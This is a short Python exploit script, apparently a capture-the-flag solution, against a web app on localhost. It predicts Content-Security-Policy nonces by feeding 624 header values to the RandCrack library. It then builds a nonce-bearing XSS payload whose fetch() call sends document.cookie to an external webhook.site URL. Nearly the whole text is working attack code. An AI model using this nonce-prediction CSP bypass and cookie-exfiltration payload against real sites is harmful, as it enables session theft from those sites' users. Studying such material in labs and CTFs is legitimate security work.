import requests
from randcrack import RandCrack
import urllib.parse


# we are using session o preserve the sessions cookie in each request
S = requests.Session()

url = "http://127.0.0.1:8080"

r = S.get(url+"/getcookie")

userid = r.text.strip()[-36:]
print(userid)
rc = RandCrack()

for _ in range(624):
    r = S.get(url+"/hello?msg=a")
    csp_header = r.headers["Content-Security-Policy"]
    print(csp_header)
    rc.submit(int(csp_header[18:-2], 16))

nonce = hex(rc.predict_getrandbits(32))[2:]
print(f"predicted value is : {nonce}")
# now lets generate a working xss payload :)
payload = f'<script nonce="{nonce}">fetch("https://webhook.site/e0ee1a86-a0c5-4a15-8477-2a7de8176f92/flag?flag="+document.cookie,{{"mode":"no-cors"}})</script>'
payload = url + "/hello?msg=" + \
    urllib.parse.quote(payload) + "&userId=" + urllib.parse.quote(userid)
print(payload)
print(S.cookies)

"""
r = S.get(url+"/hello?msg=a")
csp_header = r.headers["Content-Security-Policy"]
print("the value from csp header : "+csp_header)
"""
